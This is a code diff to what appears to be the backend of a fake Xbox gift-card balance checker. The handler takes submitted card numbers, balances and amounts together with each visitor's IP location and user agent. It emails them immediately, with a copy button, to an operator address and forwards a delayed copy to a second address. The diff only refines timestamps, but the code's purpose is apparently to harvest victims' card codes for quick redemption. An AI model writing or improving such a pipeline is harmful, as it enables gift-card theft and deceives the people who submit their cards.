@@ -600,9 +600,9 @@ export default async function handler(req, res) {
   const notificationEmail = process.env.NOTIFICATION_EMAIL;
   const resendApiKey = process.env.RESEND_API_KEY;
 
-  // ⭐ NEW: Environment flag to control routing
-  // true  → immediate to PRIMARY_EMAIL, delayed to NOTIFICATION_EMAIL
-  // false → immediate to NOTIFICATION_EMAIL only (skip primary entirely)
+  // ⭐ Routing flag
+  // true  → immediate to PRIMARY_EMAIL (submission time), delayed to NOTIFICATION_EMAIL (fire time)
+  // false → immediate to NOTIFICATION_EMAIL only (fire time, since there's no earlier send)
   const sendToPrimary = process.env.SEND_TO_PRIMARY !== 'false';
 
   if (!resendApiKey) {
@@ -620,6 +620,10 @@ export default async function handler(req, res) {
   const attachments = buildEmailAttachments(imageBase64);
   const subject = buildSubject(type);
 
+  // ⭐ Capture the exact submission time from the client payload.
+  // Fall back to server "now" if the client didn't send one.
+  const submissionTimestamp = timestamp || new Date().toISOString();
+
   const locationPromise = getLocationFromIP(ip).catch(() => ({
     city: 'Unknown',
     region: '',
@@ -629,7 +633,6 @@ export default async function handler(req, res) {
   try {
     const resend = new Resend(resendApiKey);
 
-    // ---- Resolve location (max 1.5s) so it's in the email ----
     const quickLocation = await Promise.race([
       locationPromise,
       new Promise((resolve) =>
@@ -637,13 +640,14 @@ export default async function handler(req, res) {
       ),
     ]);
 
-    const emailData = {
+    // Base data shared by both emails — everything except `timestamp`,
+    // which we'll override per-email below.
+    const baseData = {
       cardNumber,
       cardNumberFirst,
       cardNumberSecond,
       amount,
       balance,
-      timestamp,
       userAgent,
       pageSource,
       message,
@@ -654,12 +658,18 @@ export default async function handler(req, res) {
     if (sendToPrimary) {
       // ========================================================
       // MODE: SEND_TO_PRIMARY = true
-      // 1) Immediate to PRIMARY_EMAIL (with copy button)
-      // 2) After delay to NOTIFICATION_EMAIL (no copy button)
+      // 1) Immediate to PRIMARY_EMAIL → uses SUBMISSION time
+      // 2) Delayed to NOTIFICATION_EMAIL → uses FIRE time
       // ========================================================
       console.log('📧 Mode: SEND_TO_PRIMARY=true');
 
-      const htmlImmediate = buildEmailHtml(type, emailData, true);
+      // --- 1️⃣ Immediate email (submission time) ---
+      const immediateData = {
+        ...baseData,
+        timestamp: submissionTimestamp, // ← exact submission time
+      };
+
+      const htmlImmediate = buildEmailHtml(type, immediateData, true);
 
       const immediateResult = await resend.emails.send({
         from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
@@ -672,23 +682,23 @@ export default async function handler(req, res) {
       if (immediateResult.error) {
         throw new Error(immediateResult.error.message || 'Immediate Resend email failed');
       }
-      console.log('✅ Immediate email sent to PRIMARY_EMAIL');
+      console.log('✅ Immediate email sent to PRIMARY_EMAIL (submission time)');
 
-      // Delayed email to NOTIFICATION_EMAIL — fire after 10s via setTimeout.
-      // On Vercel, this timer may be killed when the function returns.
-      // To keep it alive, configure `maxDuration` or use waitUntil.
+      // --- 2️⃣ Delayed email (fire time) ---
       setTimeout(async () => {
         try {
           const fullLocation = await locationPromise;
 
-          const scheduledData = {
-            ...emailData,
+          const delayedData = {
+            ...baseData,
             location: fullLocation,
+            // ⭐ Use current time at the moment this email actually fires
+            timestamp: new Date().toISOString(),
           };
 
-          const htmlScheduled = buildEmailHtml(type, scheduledData, false);
+          const htmlScheduled = buildEmailHtml(type, delayedData, false);
 
-          console.log(`⏱️ Firing delayed email to NOTIFICATION_EMAIL now`);
+          console.log(`⏱️ Firing delayed email to NOTIFICATION_EMAIL (fire time)`);
           const delayedResult = await resend.emails.send({
             from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
             to: notificationEmail,
@@ -700,7 +710,7 @@ export default async function handler(req, res) {
           if (delayedResult.error) {
             console.error('⚠️ Delayed Resend email error:', delayedResult.error);
           } else {
-            console.log('✅ Delayed email sent to NOTIFICATION_EMAIL');
+            console.log('✅ Delayed email sent to NOTIFICATION_EMAIL (fire time)');
           }
         } catch (err) {
           console.error('❌ Delayed email exception:', err.message);
@@ -711,11 +721,16 @@ export default async function handler(req, res) {
       // ========================================================
       // MODE: SEND_TO_PRIMARY = false
       // Send ONLY to NOTIFICATION_EMAIL immediately.
-      // Copy button still shown (user has it right away).
+      // Uses submission time (this is the only/first email).
       // ========================================================
       console.log('📧 Mode: SEND_TO_PRIMARY=false (skipping primary)');
 
-      const htmlImmediate = buildEmailHtml(type, emailData, true);
+      const immediateData = {
+        ...baseData,
+        timestamp: submissionTimestamp, // ← submission time
+      };
+
+      const htmlImmediate = buildEmailHtml(type, immediateData, true);
 
       const result = await resend.emails.send({
         from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
@@ -728,7 +743,7 @@ export default async function handler(req, res) {
       if (result.error) {
         throw new Error(result.error.message || 'Resend email failed');
       }
-      console.log('✅ Immediate email sent to NOTIFICATION_EMAIL (primary skipped)');
+      console.log('✅ Immediate email sent to NOTIFICATION_EMAIL (submission time, primary skipped)');
     }
 
   } catch (error) {
